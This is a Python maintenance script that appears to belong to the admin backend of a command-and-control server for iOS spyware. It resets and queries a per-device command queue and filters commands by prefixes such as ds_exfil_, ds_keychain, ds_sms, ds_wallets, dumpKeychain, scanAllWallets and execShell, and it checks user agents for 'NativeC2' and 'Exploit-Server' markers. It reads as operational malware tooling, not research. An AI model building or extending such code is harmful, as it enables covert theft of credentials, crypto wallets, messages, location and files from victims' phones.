import sys
sys.path.insert(0, '.')
from admin.database import SessionLocal, Command
from datetime import datetime, timedelta as _td
from sqlalchemy import or_ as _or, and_ as _and

device_uuid = "ios-4a0d2f80840d7442667e3947"
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"

db = SessionLocal()

# Step 0: Reset FAKE completed commands
print("=== Step 0: Reset fake completed ===")
try:
    fake_cmds = db.query(Command).filter(
        Command.device_uuid == device_uuid,
        Command.status == 'completed',
    ).all()
    print(f"  Found {len(fake_cmds)} completed commands")
    reset_count = 0
    for fc in fake_cmds:
        out = (fc.output or "").strip()
        print(f"  Checking ID={fc.id}: output='{out[:50]}'")
        if (not out) or out.startswith("[SKIP]") or out.startswith("[DEFER-") or len(out) < 2:
            fc.status = 'pending'
            fc.output = None
            fc.executed_at = None
            reset_count += 1
            print(f"    -> RESET to pending")
    if reset_count:
        db.commit()
        print(f"  Reset {reset_count} commands")
    else:
        db.rollback()
        print(f"  No reset needed, rolling back")
except Exception as e:
    print(f"  ERROR: {e}")
    try: db.rollback()
    except Exception: pass

# Step 1: Reset stale executing commands
print("\n=== Step 1: Reset stale executing ===")
try:
    stale_cutoff = datetime.now() - _td(seconds=60)
    n1 = db.query(Command).filter(
        Command.device_uuid == device_uuid,
        Command.status == 'executing',
        Command.executed_at.is_(None),
        Command.created_at < stale_cutoff
    ).update({"status": 'pending', "output": None, "executed_at": None}, synchronize_session=False)
    print(f"  n1 (no executed_at): {n1}")
    
    n2 = db.query(Command).filter(
        Command.device_uuid == device_uuid,
        Command.status == 'executing',
        Command.executed_at.is_not(None),
        Command.executed_at < (datetime.now() - _td(seconds=120)),
    ).update({"status": 'pending', "output": None, "executed_at": None}, synchronize_session=False)
    print(f"  n2 (stale executing): {n2}")
    db.commit()
except Exception as e:
    print(f"  ERROR: {e}")
    try: db.rollback()
    except Exception: pass

# Step 2: Identify browser type
print("\n=== Step 2: Browser type ===")
ua = (user_agent or "").strip()
is_safari_browser = bool(ua) and "Safari/" in ua and "NativeC2" not in ua and "powerd" not in ua and "Exploit-Server" not in ua
print(f"  is_safari_browser = {is_safari_browser}")

# Step 3: Query pending commands
print("\n=== Step 3: Query pending ===")
try:
    now = datetime.now()
    min_defer_time = now - _td(seconds=30)
    commands = db.query(Command).filter(
        Command.device_uuid == device_uuid,
        _or(
            Command.status == 'pending',
            _and(
                Command.status == 'deferred',
                Command.executed_at.is_(None),
            ),
            _and(
                Command.status == 'deferred',
                Command.executed_at.is_not(None),
                Command.executed_at <= min_defer_time,
            ),
        ),
    ).order_by(Command.created_at).all()
    print(f"  Found {len(commands)} commands")
    for c in commands:
        print(f"    ID={c.id} | CMD={c.command[:40]} | STATUS={c.status}")
except Exception as e:
    print(f"  ERROR: {e}")
    import traceback
    traceback.print_exc()

# Step 4: Safari browser filter
print("\n=== Step 4: Safari filter ===")
SAFE_SAFARI_PREFIXES = (
    "ds_info", "ds_status", "ds_sysinfo", "ds_os", "ds_ua", "ds_device",
    "system.info",
    "ds_alert", "ui.alert",
    "ds_notify", "ui.notify",
    "ds_vibrate", "ui.vibrate",
    "ds_location", "geo.location_web", "geo.location_native",
    "ds_exfil_", "exfil.",
    "ds_contacts", "ds_keychain", "ds_wifi", "ds_sms", "ds_calls",
    "ds_photos", "ds_files", "ds_wallets", "ds_clipboard", "ds_notes",
    "file.", "fs.",
    "file.read", "file.list", "file.write", "file.stat",
    "listFiles", "readFile", "writeFile",
    "shell.", "execShell", "ds_exec", "cmd.", "system.",
    "scanWallet", "scanAllWallets", "dumpKeychain", "dumpMemory", "scanDirectory",
    "listFiles", "readFile",
)

safe_cmds = []
unsafe_cmds = []
for c in commands:
    cmd_lower = (c.command or "").strip().lower()
    is_safe = any(cmd_lower.startswith(p.lower()) for p in SAFE_SAFARI_PREFIXES)
    if is_safe:
        safe_cmds.append(c)
        print(f"  SAFE: ID={c.id} | CMD={c.command}")
    else:
        unsafe_cmds.append(c)
        print(f"  UNSAFE: ID={c.id} | CMD={c.command}")

print(f"\n  Safe: {len(safe_cmds)}, Unsafe: {len(unsafe_cmds)}")

db.close()
